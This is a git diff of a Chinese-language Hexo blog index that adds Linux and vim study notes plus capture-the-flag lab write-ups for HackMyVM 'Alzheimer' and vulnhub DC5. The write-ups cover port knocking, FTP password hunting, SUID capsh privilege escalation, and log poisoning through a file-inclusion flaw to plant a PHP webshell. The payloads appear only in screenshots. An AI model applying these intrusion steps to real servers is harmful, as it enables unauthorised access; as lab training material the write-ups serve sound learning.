+<li><a href="#%E8%BF%9B%E5%85%A5%E9%80%80%E5%87%BA%E7%BC%96%E8%BE%91%E6%A8%A1%E5%BC%8F">进入&#x2F;退出编辑模式</a></li>
+<li><a href="#%E7%A7%BB%E5%8A%A8%E5%85%89%E6%A0%87">移动光标</a></li>
+<li><a href="#%E5%A4%8D%E5%88%B6%E5%89%AA%E5%88%87%E7%B2%98%E8%B4%B4">复制、剪切、粘贴</a></li>
+<li><a href="#%E6%92%A4%E9%94%80--%E6%81%A2%E5%A4%8D">撤销 &amp; 恢复</a></li>
+<li><a href="#%E4%BB%A3%E7%A0%81%E7%BC%A9%E8%BF%9B">代码缩进</a></li>
+<li><a href="#%E7%AA%97%E5%8F%A3--%E6%A0%87%E7%AD%BE%E7%AE%A1%E7%90%86">窗口 &amp; 标签管理</a></li>
+<li><a href="#%E7%AA%97%E5%8F%A3%E5%AF%B9%E9%BD%90">窗口对齐</a></li>
+<li><a href="#vim-%E9%85%8D%E7%BD%AE">Vim 配置</a></li>
+<li><a href="#g%E7%BC%96%E8%AF%91">g++编译</a></li>
+</ul>
+</li>
+<li><a href="#%E6%8F%92%E4%BB%B6%E7%AE%A1%E7%90%86">插件管理</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="文件基础操作"><a href="#文件基础操作" class="headerlink" title="文件基础操作"></a>文件基础操作</h2><h3 id="核心指令"><a href="#核心指令" class="headerlink" title="核心指令"></a>核心指令</h3><h4 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span>          <span class="comment"># 列出目录内容</span></span><br><span class="line"><span class="built_in">ls</span> -l       <span class="comment"># 长格式显示（包含权限信息）</span></span><br><span class="line"><span class="built_in">ls</span> -a       <span class="comment"># 显示隐藏文件</span></span><br><span class="line"><span class="built_in">cd</span> ~        <span class="comment"># 返回用户目录</span></span><br><span class="line"><span class="built_in">pwd</span>         <span class="comment"># 显示当前路径</span></span><br><span class="line"><span class="built_in">cat</span> file    <span class="comment"># 查看文件内容</span></span><br><span class="line"><span class="built_in">cp</span> src.txt dest/          <span class="comment"># 复制文件</span></span><br><span class="line"><span class="built_in">cp</span> -R <span class="built_in">dir</span>/ dest/          <span class="comment"># 复制目录需要-R参数</span></span><br><span class="line"><span class="built_in">mv</span> old.txt new.txt        <span class="comment"># 重命名文件</span></span><br><span class="line"><span class="built_in">mkdir</span> project             <span class="comment"># 创建目录</span></span><br><span class="line"><span class="built_in">rmdir</span> empty_dir           <span class="comment"># 删除空目录</span></span><br><span class="line"><span class="built_in">rm</span> -rf temp/              <span class="comment">#强制递归删除目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理含空格文件名</span></span><br><span class="line"><span class="built_in">touch</span> <span class="string">&quot;file name.txt&quot;</span>     <span class="comment"># 创建带空格文件</span></span><br><span class="line"><span class="built_in">ls</span> file\ name.txt         <span class="comment"># 转义空格查看</span></span><br></pre></td></tr></table></figure></div>
+<h4 id="内容处理"><a href="#内容处理" class="headerlink" title="内容处理"></a>内容处理</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STAN"><figure class="iseeu highlight /stan"><table><tr><td class="code"><pre><span class="line">wc -l access.<span class="built_in">log</span>          <span class="comment"># 统计行数</span></span><br><span class="line">diff file1 file2          <span class="comment"># 文件差异对比</span></span><br><span class="line"><span class="built_in">head</span> -n <span class="number">20</span> <span class="built_in">log</span>.txt        <span class="comment"># 查看前20行</span></span><br><span class="line"><span class="built_in">tail</span> -f service.<span class="built_in">log</span>       <span class="comment"># 实时追踪日志更新</span></span><br><span class="line">grep <span class="string">&quot;error&quot;</span> *.<span class="built_in">log</span>        <span class="comment"># 多文件关键词搜索</span></span><br></pre></td></tr></table></figure></div>
+<h4 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRMSH"><figure class="iseeu highlight /crmsh"><table><tr><td class="code"><pre><span class="line">-rw-r--r-- <span class="number">1</span> <span class="keyword">user</span> <span class="title">group</span> <span class="number">4096</span> Jan <span class="number">1</span> <span class="number">00</span>:<span class="number">00</span> file.txt</span><br><span class="line"><span class="comment"># 第1位：文件类型（-普通文件，d目录）</span></span><br><span class="line"><span class="comment"># 2-4位：用户权限（rw-）</span></span><br><span class="line"><span class="comment"># 5-7位：组权限（r--）</span></span><br><span class="line"><span class="comment"># 8-10位：其他用户权限（r--）</span></span><br></pre></td></tr></table></figure></div>
+<h4 id="权限修改"><a href="#权限修改" class="headerlink" title="权限修改"></a>权限修改</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+x script.sh      <span class="comment"># 添加用户执行权限</span></span><br><span class="line"><span class="built_in">chmod</span> go-w secret.txt    <span class="comment"># 移除组和其他写权限</span></span><br><span class="line"><span class="built_in">chmod</span> 755 executable     <span class="comment"># 数字模式权限设置（rwxr-xr-x）</span></span><br><span class="line">chomd 600  id_rsa        <span class="comment"># 仅文件所有者可读写，其他人无权限</span></span><br></pre></td></tr></table></figure></div>
+<h3 id="shell脚本"><a href="#shell脚本" class="headerlink" title="shell脚本"></a>shell脚本</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># Shell 脚本基础示例</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 变量赋值与引用</span></span><br><span class="line">VAR=<span class="string">&quot;Hello World&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;变量内容：<span class="variable">$VAR</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取用户输入</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;请输入你的名字：&quot;</span> name</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;你好，<span class="variable">$name</span>！&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令行参数处理</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;执行脚本名：<span class="variable">$0</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第一个参数：<span class="variable">$1</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;参数个数：<span class="variable">$#</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;所有参数：<span class="variable">$@</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 条件判断</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;错误：缺少参数！&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ -d <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$1</span> 是目录&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ -f <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$1</span> 是普通文件&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;未知文件类型&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 逻辑判断（&amp;&amp; || 逻辑运算）</span></span><br><span class="line">[ -n <span class="string">&quot;<span class="variable">$name</span>&quot;</span> ] &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;你输入了名字：<span class="variable">$name</span>&quot;</span> || <span class="built_in">echo</span> <span class="string">&quot;未输入名字&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环示例</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..5&#125;; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;for 循环：<span class="variable">$i</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># while 循环</span></span><br><span class="line">count=1</span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$count</span> -le 3 ]; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;while 循环：<span class="variable">$count</span>&quot;</span></span><br><span class="line">    count=$((count + <span class="number">1</span>))</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取文件（假设 input.txt 存在）</span></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;input.txt&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">read</span> -r line; <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;处理内容：<span class="variable">$line</span>&quot;</span></span><br><span class="line">    <span class="keyword">done</span> &lt; input.txt</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;文件 input.txt 不存在，跳过读取&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 运算表达式</span></span><br><span class="line"><span class="built_in">sum</span>=$((<span class="number">3</span> + <span class="number">5</span>))            <span class="comment"># 整数运算</span></span><br><span class="line">mul=$(<span class="built_in">expr</span> 3 \* 5)        <span class="comment"># expr 计算</span></span><br><span class="line">mod=$(<span class="built_in">expr</span> 10 % 3)        <span class="comment"># 取模运算</span></span><br><span class="line">div=$(<span class="built_in">echo</span> <span class="string">&quot;scale=2; 3/7&quot;</span> | bc)  <span class="comment"># 浮点运算</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果输出</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;整数求和：<span class="variable">$sum</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;乘法结果：<span class="variable">$mul</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;取模结果：<span class="variable">$mod</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;浮点除法结果：<span class="variable">$div</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 比较符</span></span><br><span class="line">1. 字符比较</span><br><span class="line">- 相等：[ <span class="string">&quot;<span class="variable">$str1</span>&quot;</span> = <span class="string">&quot;<span class="variable">$str2</span>&quot;</span> ]</span><br><span class="line">- 不等：[ <span class="string">&quot;<span class="variable">$str1</span>&quot;</span> != <span class="string">&quot;<span class="variable">$str2</span>&quot;</span> ]</span><br><span class="line">- 空字符串：[ -z <span class="string">&quot;<span class="variable">$str</span>&quot;</span> ]</span><br><span class="line">- 非空字符串：[ -n <span class="string">&quot;<span class="variable">$str</span>&quot;</span> ]</span><br><span class="line">- 字典顺序比较：[ <span class="string">&quot;<span class="variable">$str1</span>&quot;</span> \&gt; <span class="string">&quot;<span class="variable">$str2</span>&quot;</span> ] 或 [[ <span class="string">&quot;<span class="variable">$str1</span>&quot;</span> &gt; <span class="string">&quot;<span class="variable">$str2</span>&quot;</span> ]]</span><br><span class="line"></span><br><span class="line">2. 数字比较</span><br><span class="line">- 相等：[ <span class="string">&quot;<span class="variable">$num1</span>&quot;</span> -eq <span class="string">&quot;<span class="variable">$num2</span>&quot;</span> ]</span><br><span class="line">- 不等：[ <span class="string">&quot;<span class="variable">$num1</span>&quot;</span> -ne <span class="string">&quot;<span class="variable">$num2</span>&quot;</span> ]</span><br><span class="line">- 大于：[ <span class="string">&quot;<span class="variable">$num1</span>&quot;</span> -gt <span class="string">&quot;<span class="variable">$num2</span>&quot;</span> ]</span><br><span class="line">- 小于：[ <span class="string">&quot;<span class="variable">$num1</span>&quot;</span> -lt <span class="string">&quot;<span class="variable">$num2</span>&quot;</span> ]</span><br><span class="line">- 大于或等于：[ <span class="string">&quot;<span class="variable">$num1</span>&quot;</span> -ge <span class="string">&quot;<span class="variable">$num2</span>&quot;</span> ]</span><br><span class="line">- 小于或等于：[ <span class="string">&quot;<span class="variable">$num1</span>&quot;</span> -le <span class="string">&quot;<span class="variable">$num2</span>&quot;</span> ]</span><br><span class="line"></span><br><span class="line">3. 简化数字比较</span><br><span class="line">使用 (( )) 比较数字：</span><br><span class="line">- 相等：(( num1 == num2 ))</span><br><span class="line">- 大于：(( num1 &gt; num2 ))</span><br><span class="line">- 小于：(( num1 &lt; num2 ))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数示例</span></span><br><span class="line"><span class="function"><span class="title">greet</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;欢迎，<span class="variable">$1</span>！&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">greet <span class="string">&quot;Shell 学习者&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前日期</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;当前时间：<span class="subst">$(date <span class="string">&quot;+%Y-%m-%d %H:%M:%S&quot;</span>)</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<h3 id="vim-基础"><a href="#vim-基础" class="headerlink" title="vim 基础"></a>vim 基础</h3><h4 id="进入-退出编辑模式"><a href="#进入-退出编辑模式" class="headerlink" title="进入&#x2F;退出编辑模式"></a>进入&#x2F;退出编辑模式</h4><ul>
+<li>按 <code>i</code> 进入编辑模式，<code>ESC</code> 退出编辑模式，返回命令模式。  </li>
+<li>在命令模式下：<ul>
+<li><code>:wq</code> <strong>保存并退出</strong>  </li>
+<li><code>:q!</code> <strong>不保存退出</strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="移动光标"><a href="#移动光标" class="headerlink" title="移动光标"></a>移动光标</h4><ul>
+<li><code>HJKL</code> 在命令模式下分别表示：<ul>
+<li><code>H</code> 左</li>
+<li><code>J</code> 下</li>
+<li><code>K</code> 上</li>
+<li><code>L</code> 右</li>
+</ul>
+</li>
+<li><code>w</code> 按单词向前移动光标，<code>b</code> 反向移动  </li>
+<li><mark>Ctrl + F</mark> (<strong>Foreword</strong>) <strong>向下翻页</strong> (<code>PageDown</code>)  </li>
+<li><mark>Ctrl + B</mark> (<strong>Backwards</strong>) <strong>向上翻页</strong> (<code>PageUp</code>)  </li>
+<li><code>数字 + gg</code> 跳转到指定行  </li>
+<li><code>数字 + j/k</code> 跳转多行  </li>
+<li><code>/关键词</code> 搜索关键字，<code>n</code> 下一个，<code>Shift + N</code> 上一个</li>
+</ul>
+<h4 id="复制、剪切、粘贴"><a href="#复制、剪切、粘贴" class="headerlink" title="复制、剪切、粘贴"></a>复制、剪切、粘贴</h4><ul>
+<li><code>cc</code> <strong>剪切一行</strong>（可加数字，如 <code>c2c</code> 剪切两行）  </li>
+<li><code>yy</code> <strong>复制当前行</strong>  </li>
+<li><code>p</code> <strong>粘贴</strong>  </li>
+<li>在命令模式下：<ul>
+<li><code>:%y</code> <strong>复制整个文件</strong>  </li>
+<li><code>ggVG</code> <strong>选中全部文本</strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="撤销-恢复"><a href="#撤销-恢复" class="headerlink" title="撤销 &amp; 恢复"></a>撤销 &amp; 恢复</h4><ul>
+<li><code>u</code> <strong>撤销</strong>（Undo）  </li>
+<li><code>Ctrl + R</code> <strong>恢复撤销的操作</strong>（Redo）</li>
+</ul>
+<h4 id="代码缩进"><a href="#代码缩进" class="headerlink" title="代码缩进"></a>代码缩进</h4><ul>
+<li><code>v</code> 进入 <strong>可视模式</strong>，选中文本后：<ul>
+<li><code>&lt;</code> <strong>减少缩进</strong>  </li>
+<li><code>&gt;</code> <strong>增加缩进</strong>  </li>
+<li><code>+y</code> <strong>复制选中内容</strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="窗口-标签管理"><a href="#窗口-标签管理" class="headerlink" title="窗口 &amp; 标签管理"></a>窗口 &amp; 标签管理</h4><ul>
+<li><code>:tabnew [文件]</code> <strong>新建标签页</strong>  </li>
+<li><code>:tabc</code> <strong>关闭当前标签</strong>  </li>
+<li><code>:tabo</code> <strong>关闭其他所有标签</strong>  </li>
+<li><code>:tabs</code> <strong>查看所有打开的标签</strong>  </li>
+<li><code>:tabp / :tabn</code> <strong>切换前&#x2F;后一个标签</strong>  </li>
+<li>标准模式下：<ul>
+<li><code>gt</code> <strong>下一个 tab</strong>  </li>
+<li><code>gT</code> <strong>上一个 tab</strong></li>
+</ul>
+</li>
+<li><code>R</code> <strong>刷新 NerdTree</strong></li>
+</ul>
+<h4 id="窗口对齐"><a href="#窗口对齐" class="headerlink" title="窗口对齐"></a>窗口对齐</h4><ul>
+<li><code>zz</code> <strong>让光标所在行位于屏幕中间</strong>  </li>
+<li><code>zt</code> <strong>让光标所在行置顶</strong>  </li>
+<li><code>zb</code> <strong>让光标所在行置底</strong>  </li>
+<li><code>Ctrl + E</code> <strong>向下滚动一行</strong>  </li>
+<li><code>Ctrl + Y</code> <strong>向上滚动一行</strong></li>
+</ul>
+<h4 id="Vim-配置"><a href="#Vim-配置" class="headerlink" title="Vim 配置"></a>Vim 配置</h4><ul>
+<li>在命令模式下输入：<ul>
+<li><code>:syntax on</code> <strong>开启代码高亮</strong>  </li>
+<li><code>:set number</code> <strong>显示行号</strong></li>
+</ul>
+</li>
+<li><strong>全局生效</strong>：编辑 <code>~/.vimrc</code> 文件，添加：<br>syntax on<br>set number</li>
+</ul>
+<h4 id="g-编译"><a href="#g-编译" class="headerlink" title="g++编译"></a>g++编译</h4><p>默认编译： <code>g++ [选项] -o 生成文件名 源文件.cpp</code>  如果不加 -o 选项，默认会生成 a.out<br>使用c++11标准： <code>g++ -std=c++11 file.cpp</code></p>
+<h3 id="插件管理"><a href="#插件管理" class="headerlink" title="插件管理"></a>插件管理</h3><p>安装Vim-Plug（插件管理器）：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">curl -fLo ~/.<span class="keyword">vim</span>/autoload/plug.<span class="keyword">vim</span> --create-dirs \</span><br><span class="line">     https://raw.githubusercontent.<span class="keyword">com</span>/junegunn/<span class="keyword">vim</span>-plug/master/plug.<span class="keyword">vim</span></span><br></pre></td></tr></table></figure></div>
+
+<p>安装插件： 在 ~&#x2F;.vimrc 添加</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LEAF"><figure class="iseeu highlight /leaf"><table><tr><td class="code"><pre><span class="line">call plug<span class="punctuation">#</span><span class="keyword">begin</span><span class="params">(&#x27;~<span class="operator">/</span>.<span class="variable">vim</span><span class="operator">/</span><span class="variable">plugged</span>&#x27;)</span></span><br><span class="line">Plug &#x27;preservim/nerdtree&#x27;</span><br><span class="line">Plug &#x27;junegunn/fzf&#x27;</span><br><span class="line">call plug<span class="punctuation">#</span><span class="keyword">end</span><span class="params">()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>插件指令：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">:PlugInstall</span>        <span class="comment"># 安装插件（从 ~/.vimrc 配置的源下载并安装插件）</span></span><br><span class="line"><span class="symbol">:PlugUpdate</span>         <span class="comment"># 更新已安装的插件</span></span><br><span class="line"><span class="symbol">:PlugUpgrade</span>        <span class="comment"># 更新 Vim-Plug 本身</span></span><br><span class="line"><span class="symbol">:PlugClean</span>          <span class="comment"># 清理无用的插件（删除未在 ~/.vimrc 配置中的插件）</span></span><br><span class="line"><span class="symbol">:PlugStatus</span>         <span class="comment"># 显示已安装插件的状态</span></span><br><span class="line"><span class="symbol">:PlugDiff</span>           <span class="comment"># 显示本地插件与远程仓库的差异</span></span><br></pre></td></tr></table></figure></div>]]></content>
+      <categories>
+        <category>linux</category>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>操作系统</tag>
+        <tag>shell</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>DC1靶场复盘</title>
     <url>/posts/52872.html</url>
     <content><![CDATA[<p>vulnhub-DC1靶场复盘</p>
@@ -1452,8 +1424,36 @@
       </categories>
       <tags>
         <tag>渗透</tag>
-        <tag>靶场</tag>
         <tag>vulnhub</tag>
+        <tag>靶场</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HMV-Alzheimer</title>
+    <url>/posts/16384.html</url>
+    <content><![CDATA[<p>HMV-Alzheimer靶场复盘</p>
+<span id="more"></span>
+<p><img src="https://pic1.imgdb.cn/item/679a35f1d0e0a243d4f878cb.png"></p>
+<h1 id="Alzheimer"><a href="#Alzheimer" class="headerlink" title="Alzheimer"></a>Alzheimer</h1><h2 id="端口扫描-信息收集"><a href="#端口扫描-信息收集" class="headerlink" title="端口扫描&#x2F;信息收集"></a>端口扫描&#x2F;信息收集</h2><p> <img src="https://pic1.imgdb.cn/item/679a400bd0e0a243d4f87a4b.png"><br>三个端口  只有21端口现在是开放的  80和22都是有防火墙<br>先尝试能不能匿名登录ftp  然后上传反弹shell文件<br><img src="https://pic1.imgdb.cn/item/679a4010d0e0a243d4f87a4c.png"><br>发现有一个.secretnote.txt 下载到本地查看<br><img src="https://pic1.imgdb.cn/item/679a4014d0e0a243d4f87a4d.png"><br>提示我们要用knock服务 按这个顺序发送请求包才能打开端口</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="YAML"><figure class="iseeu highlight /yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">┌──(root㉿kakeru)-[~/alz]</span></span><br><span class="line"><span class="string">└─#</span> <span class="string">knock</span> <span class="string">-u</span> <span class="number">192.168</span><span class="number">.240</span><span class="number">.125</span> <span class="number">1000 </span><span class="number">2000 </span><span class="number">3000</span></span><br></pre></td></tr></table></figure></div>
+<p>但是敲门之后还是无法打开两个端口  查了wp  发现和橘墨大佬的问题一样 因为我修改过网卡，所以去修改靶机的knockd配置文件<br><img src="https://pic1.imgdb.cn/item/679a4014d0e0a243d4f87a4e.png" alt="|500"><br><code>service knockd restart</code><br><img src="https://pic1.imgdb.cn/item/679a403ed0e0a243d4f87a59.png"><br>修改配置文件之后在knock就可以访问80端口了</p>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://pic1.imgdb.cn/item/679a403fd0e0a243d4f87a5a.png"><br>提示密码存在一个.txt文件中  用户名是 medusa   并且给了一个摩丝密码 nothing<br>现在进行目录扫描<br><img src="https://pic1.imgdb.cn/item/679a4044d0e0a243d4f87a5b.png"><br>这里给了三个重定向的目录 一次访问试试</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/secret/</span></span><br><span class="line">Maybe my password is in this secret folder?</span><br><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/home/  </span></span><br><span class="line">Maybe my pass is at home!</span><br><span class="line">-medusa</span><br><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/admin/</span></span><br><span class="line"><span class="variable">&lt;html&gt;</span></span><br><span class="line"><span class="variable">&lt;head&gt;</span><span class="variable">&lt;title&gt;</span>403 Forbidden<span class="variable">&lt;/title&gt;</span><span class="variable">&lt;/head&gt;</span></span><br><span class="line"><span class="variable">&lt;body bgcolor=&quot;white&quot;&gt;</span></span><br><span class="line"><span class="variable">&lt;center&gt;</span><span class="variable">&lt;h1&gt;</span>403 Forbidden<span class="variable">&lt;/h1&gt;</span><span class="variable">&lt;/center&gt;</span></span><br><span class="line"><span class="variable">&lt;hr&gt;</span><span class="variable">&lt;center&gt;</span>nginx/1.14.2<span class="variable">&lt;/center&gt;</span></span><br><span class="line"><span class="variable">&lt;/body&gt;</span></span><br><span class="line"><span class="variable">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>提示密码在secret目录中 又在文件home中所以访问&#x2F;secret&#x2F;home&#x2F;</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/secret/home/</span></span><br><span class="line"></span><br><span class="line">Im trying a lot. Im sure <span class="keyword">that</span> i will recover <span class="keyword">my</span> pass!</span><br><span class="line"></span><br><span class="line">-medusa</span><br></pre></td></tr></table></figure></div>
+<p>还是没有直接的密码<br>没有思路查看wp后才知道密码藏在ftp里面 但是是在knock之后过的ftp中  这个老六。。。<br><img src="https://pic1.imgdb.cn/item/679a4045d0e0a243d4f87a5d.png"><br>这个就是medusa的密码<br><img src="https://pic1.imgdb.cn/item/679a4047d0e0a243d4f87a5e.png"><br>拿到shell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a407ed0e0a243d4f87a61.png"><br>发现有sudo命令  但是这个无法提权<br>继续查suid文件<br><img src="https://pic1.imgdb.cn/item/679a4083d0e0a243d4f87a64.png"><br>搜索都可以用capsh提权<br><img src="https://pic1.imgdb.cn/item/679a407fd0e0a243d4f87a62.png"><br><img src="https://pic1.imgdb.cn/item/679a4082d0e0a243d4f87a63.png"><br>拿到flag</p>
+<p>密码存在knock之后的ftp的文件中也太阴险了。。。</p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>hmv</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>靶场</tag>
+        <tag>HMV</tag>
       </tags>
   </entry>
   <entry>
@@ -1472,8 +1472,8 @@
       </categories>
       <tags>
         <tag>渗透</tag>
-        <tag>靶场</tag>
         <tag>vulnhub</tag>
+        <tag>靶场</tag>
       </tags>
   </entry>
   <entry>
@@ -1492,8 +1492,8 @@
       </categories>
       <tags>
         <tag>渗透</tag>
-        <tag>靶场</tag>
         <tag>vulnhub</tag>
+        <tag>靶场</tag>
       </tags>
   </entry>
   <entry>
@@ -1518,8 +1518,27 @@
       </categories>
       <tags>
         <tag>渗透</tag>
-        <tag>靶场</tag>
         <tag>vulnhub</tag>
+        <tag>靶场</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC5靶场复盘</title>
+    <url>/posts/19078.html</url>
+    <content><![CDATA[<p>vulnhub-DC5靶场复盘</p>
+<span id="more"></span>
+<h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p>这题的靶场提示要在web找到刷新改变的东西<br><img src="https://pic1.imgdb.cn/item/679a1f6ed0e0a243d4f87639.png"><br>这个靶机只有一个80端口 没有22ssh端口<br>而且这个网站没有用cms  是一个静态的页面</p>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>在contact us 里有输入框 用sqlmap 扫描之后没有注入点<br>在contact us 输入内容返回的thank you.php 界面刷新 发现下面的footer会刷新 查看页面源代码<br><img src="https://pic1.imgdb.cn/item/679a1f6fd0e0a243d4f8763a.png" alt="|450"><br>这个界面是有一个footer.php的 所以这里有一个文件包含漏洞  因为是其他有调用这个footer.php<br>但是现在不知道用什么关键字访问到包含文件  所以我们用wfuzz跑关键字<br><img src="https://pic1.imgdb.cn/item/679a1f6fd0e0a243d4f8763b.png" alt="|575"><br><img src="https://pic1.imgdb.cn/item/679a1f70d0e0a243d4f8763c.png"><br>找到了关键字是file  现在就可以访问服务器中的文件了   <strong>现在的又一个难题是只能看到文件如何才能拿到shell呢</strong><br>我们知道如果可以写入一个一句话木马就可以拿到shell   但是应该用什么方式实现呢？<br>用apache2服务访问的日志 错误日志也会存 存在&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log 中  这里没有我们就用nginx<br>下一步就是用bp修改<br><img src="https://pic1.imgdb.cn/item/679a1f70d0e0a243d4f8763c.png" alt="|425"><br>这一条记录会在access.log中<br><img src="https://pic1.imgdb.cn/item/679a1f98d0e0a243d4f8763e.png"><br>我们的标记存在 而且后面的php代码没有显示出来 说明被成功解析了  用蚁剑连接shell</p>
